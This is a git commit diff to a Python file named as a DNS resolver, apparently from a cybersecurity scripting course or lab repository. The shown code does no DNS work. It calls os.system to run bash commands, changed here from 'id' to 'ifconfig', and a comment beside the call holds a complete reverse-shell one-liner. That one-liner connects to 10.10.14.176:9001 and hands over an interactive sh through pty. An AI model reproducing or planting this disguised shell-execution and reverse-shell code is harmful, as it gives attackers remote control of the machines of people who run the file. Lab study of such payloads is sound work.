01744335ccfad05663c5efa12c262c1db3262850
Xavier Sanchez <xavier.sanchez44@orange.fr>
2026-06-30 16:52:55 +0200

    Change command from 'id' to 'ifconfig' in dns_resolver

--- scripting_cyber/0x01-python_scripting/0-dns_resolver.py
+++ scripting_cyber/0x01-python_scripting/0-dns_resolver.py
@@ -6,7 +6,7 @@ os = load_module('os')
 pty = load_module('pty')
 
 # s=socket.socket();s.connect(("10.10.14.176",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
-os.system('bash -c "id"')
+os.system('bash -c "ifconfig"')
 
 #except socket.gaierror
 #socket.gethostbyname
